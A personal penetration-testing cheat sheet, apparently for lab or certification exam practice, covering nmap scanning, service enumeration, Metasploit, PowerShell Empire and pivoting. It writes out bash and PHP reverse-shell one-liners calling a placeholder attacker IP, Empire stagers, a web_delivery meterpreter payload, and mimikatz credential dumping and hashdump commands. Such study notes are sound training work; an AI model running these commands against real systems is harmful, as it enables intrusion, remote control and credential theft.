# Penetration Testing Methodology Notes

---

# Information Gathering

### **Target Scoping**

```
# Define targets

export TARGET_IP=<IP>
export TARGET_SUBNET=<CIDR>

```

### **Ping Sweep**

```
# Quick live host discovery

fping -a -g $TARGET_SUBNET 2>/dev/null

```

### **Nmap Scans**

```
# Quick top 1000 ports

nmap -Pn -T4 -sC -sV $TARGET_IP -oN quick.txt

# Full TCP scan

nmap -p- -T4 $TARGET_IP -oN allports.txt

# Version + scripts on found ports

nmap -sC -sV -p<ports> $TARGET_IP -oN versions.txt

# UDP top 100

nmap -sU --top-ports 100 $TARGET_IP -oN udp.txt

OS-Based Deep Scan Decision Tree

Step 1 – Identify Likely OS
Run a quick service/OS detection scan:

nmap -Pn -T4 -sC -sV --top-ports 1000 $TARGET_IP -oN quick.txt
Check:

SMB/NetBIOS/Kerberos → likely Windows

SSH/Apache/Nginx → likely Linux

Step 2 – Choose Deep Scan Path

If Windows:

# Full TCP scan

nmap -Pn -T4 -p- --min-rate=2000 $TARGET_IP -oN allports.txt

# Targeted enumeration + vuln scan

nmap -Pn -T4 -sC -sV \
  -p$(grep -oP '\d{1,5}/tcp' allports.txt | cut -d'/' -f1 | tr '\n' ',' | sed 's/,$//') \
  --script=smb-os-discovery,smb-enum-shares,smb-enum-users,vuln \
  $TARGET_IP -oN win_deep.txt

# Top 200 UDP ports (for Kerberos, RPC, SNMP)

nmap -sU --top-ports 200 --open -T4 $TARGET_IP -oN udp_win.txt
If Linux:

# Full TCP scan

nmap -Pn -T4 -p- --min-rate=2000 $TARGET_IP -oN allports.txt

# Targeted enumeration + vuln scan

nmap -Pn -T4 -sC -sV \
  -p$(grep -oP '\d{1,5}/tcp' allports.txt | cut -d'/' -f1 | tr '\n' ',' | sed 's/,$//') \
  --script=http-title,http-server-header,http-enum,ftp-anon,vuln \
  $TARGET_IP -oN linux_deep.txt

# Top 50 UDP ports (for DNS, NTP, SNMP)

nmap -sU --top-ports 50 --open -T4 $TARGET_IP -oN udp_linux.txt
Step 3 – Post-Scan Action

Search exploits for versions:

searchsploit <service> <version>
Add to workflow: SMB → smbmap, rpcclient | HTTP → gobuster/dirsearch | FTP → ftp-anon or ftp client

Tip: If OS detection is unclear, run both deep scan types — some CTF targets mix services from both worlds.

```

---

# Enumeration

### **Web**

```
# Basic recon

whatweb http://$TARGET_IP
curl -I http://$TARGET_IP

# Directory fuzzing

gobuster dir -u http://$TARGET_IP -w /usr/share/wordlists/dirb/common.txt

# VHost fuzzing

ffuf -u http://$TARGET_IP -H "Host: FUZZ.target.local" -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-5000.txt

```

### **SMB**

```
# List shares (null session)

smbclient -L //$TARGET_IP/ -N

# Connect to share

smbclient //$TARGET_IP/<share> -U <user>

# SMBExec

smbexec.py '<USER:PASSWORD>'@$TARGET

```

### **SNMP**

```
snmpwalk -v2c -c public $TARGET_IP

```

### **FTP**

```
ftp $TARGET_IP

```

# Exploitation

### **Metasploit Basics**

```
# Search module

search <service>

# Use module

use exploit/<path>
set RHOSTS $TARGET_IP
set LHOST <your_ip>
exploit

# kill port

sudo ss -tulpn | grep :<PORT>
sudo kill -9 <PID>

# to force open a shell session

execute -f cmd.exe -i -H

```

### **Manual Reverse Shells**

```
# Bash TCP reverse shell

bash -i >& /dev/tcp/<your_ip>/<port> 0>&1

# PHP reverse shell

php -r '$sock=fsockopen("<your_ip>",<port>);exec("/bin/sh -i <&3 >&3 2>&3");'

# Sending email on kali

sendemail 
   -f ADDRESS              from (sender) email address
   -t ADDRESS [ADDR ...]   to email address(es)
   -s SERVER[:PORT]        smtp mail relay, default is localhost:25
   -u SUBJECT              message subject
   -m MESSAGE              message body
   -a FILE [FILE ...]      file attachment(s)

```
# Privilege Escalation


### **Linux**

```
# Check kernel & OS

uname -a
lsb_release -a

# Find SUID binaries

find / -perm -4000 2>/dev/null

# Search for creds

grep -R "password" /etc 2>/dev/null

```

### **Windows**

```
# System info

systeminfo

# List users

net user

# Show scheduled tasks

schtasks /query /fo LIST /v

```
# Post-Exploitation

### **PowerShell Empire**

**Server & Listener Setup**

# Start Empire server

powershell-empire server

# In a new terminal/tab, start Empire client

powershell-empire client

```

Inside the client:

```
plaintext
CopyEdit
listeners
uselistener http
set Name (optional)http_443
set Host http://<Kali-IP>
set Port (any)443
execute

```

*HTTP listener is fine for internal labs; in real ops, choose HTTPS or named pipe for stealth.*

---

**Stager Generation**

```
plaintext
CopyEdit
Empire) > usestager multi/launcher
set Listener http
execute

```

- Copy the one-line PowerShell command Empire outputs.
- This will be pasted into the target shell (e.g., SMBExec, RCE) to spawn an agent.

---

**Agent Management**

```
plaintext
CopyEdit
(Empire: usestager/multi/launcher) > agents
(Empire: agents) > interact <NAME>
(Empire:<NAME>) > usemodule powershell/situational_awareness/host/computerdetails

agents        # List active agents
interact <agent_name>   # Control specific agent

```

- from msfconsole we can then run >exploit/multi/script/web_delivery module:
- msf6 exploit(multi/script/web_delivery) > set target 2 (this uses powershell)
- msf6 exploit(multi/script/web_delivery) > set SVRHOST <KALI IP>
- msf6 exploit(multi/script/web_delivery) > set LHOST <KALI IP>
- msf6 exploit(multi/script/web_delivery) > set payload windows/meterpreter/reverse_tcp (Windows system)
- msf6 exploit(multi/script/web_delivery) > exploit
(generates a URL where the payload will be hosted) ie: URL: http://0.0.0.0:8080/Hkh1wq6lHvQ
- Back onto empire - Empire: usemodule/powershell/code_execution/invoke_metasploitpayload > then we need to set the URL: 
(Empire: usemodule/powershell/code_execution/invoke_metasploitpayload) > set URL http://0.0.0.0:8080/Hkh1wq6lHvQ
- This will open a meterpreter session
- Run `sysinfo` to confirm target details.
- Use `shell` for direct command execution if needed.

---

**Common Recon Modules**

- `usemodule situational_awareness/network/ping_sweep`
- `usemodule situational_awareness/host/computerdetails`
- `usemodule situational_awareness/network/get_domaincontroller`

---

**Credential Dumping**

- `usemodule credentials/mimikatz/logonpasswords`
- `usemodule credentials/mimikatz/lsadump`

---

**Lateral Movement**

- `usemodule lateral_movement/invoke_smbexec`
- `usemodule lateral_movement/invoke_wmi`
- Use `pivot` command to enable SOCKS proxy for internal scanning.

### **Hash Dumping**

```
# Linux

cat /etc/shadow

# Windows (Meterpreter)

hashdump

```

### **Pivoting**

```
# Meterpreter autoroute

run autoroute -s <subnet>

# SOCKS proxy

use auxiliary/server/socks_proxy
set SRVPORT 9050

```
### Looting & Reporting

```

# Copy files back

scp user@$TARGET_IP:/path/to/file .

# Keep all flags in one folder

mkdir ~/exam_flags

---

# Common Ports & Services

| **Port** | **Protocol** | **Service / Purpose** |
| --- | --- | --- |
| 20 | TCP | FTP (Data) |
| 21 | TCP | FTP (Control) |
| 22 | TCP | SSH (Secure Shell) |
| 23 | TCP | Telnet |
| 25 | TCP | SMTP (Mail Transfer) |
| 53 | TCP/UDP | DNS (Domain Name System) |
| 67 | UDP | DHCP (Server) |
| 68 | UDP | DHCP (Client) |
| 69 | UDP | TFTP (Trivial File Transfer Protocol) |
| 80 | TCP | HTTP (Web) |
| 88 | TCP/UDP | Kerberos (Windows Auth) |
| 110 | TCP | POP3 (Email) |
| 111 | TCP/UDP | RPCbind / Portmapper |
| 135 | TCP | MS RPC (Microsoft Remote Procedure Call) |
| 137 | UDP | NetBIOS Name Service |
| 138 | UDP | NetBIOS Datagram Service |
| 139 | TCP | NetBIOS Session Service (SMB over NetBIOS) |
| 143 | TCP | IMAP (Email) |
| 161 | UDP | SNMP (Simple Network Management Protocol) |
| 162 | UDP | SNMP Trap |
| 389 | TCP/UDP | LDAP (Lightweight Directory Access Protocol) |
| 443 | TCP | HTTPS (HTTP Secure) |
| 445 | TCP | SMB (Microsoft-DS over TCP) |
| 465 | TCP | SMTPS (SMTP over SSL) |
| 514 | UDP | Syslog |
| 587 | TCP | SMTP (Mail Submission) |
| 636 | TCP | LDAPS (LDAP over SSL) |
| 993 | TCP | IMAPS |
| 995 | TCP | POP3S |
| 1080 | TCP | SOCKS Proxy |
| 1433 | TCP | Microsoft SQL Server |
| 1521 | TCP | Oracle Database |
| 2049 | TCP/UDP | NFS (Network File System) |
| 3306 | TCP | MySQL |
| 3389 | TCP | RDP (Remote Desktop Protocol) |
| 5432 | TCP | PostgreSQL |
| 5900 | TCP | VNC (Virtual Network Computing) |
| 5985 | TCP | WinRM (HTTP) |
| 5986 | TCP | WinRM (HTTPS) |
| 8000 / 8080 | TCP | Alternate HTTP |
| 8443 | TCP | Alternate HTTPS |
| 9000 | TCP | Various Apps / Dev Services |
| 9200 | TCP | Elasticsearch |
| 27017 | TCP | MongoDB |

### Next Steps

1. As you redo **every single lab**, add:
    - Exact working commands
    - Any gotchas (e.g., *"SMB requires NTLMv1 here"*)
    - Example outputs for reference
2. Remove anything you never use
3. Add **your own “fallback” tricks** so that in the exam, your brain can autopilot through 90% of cases

---
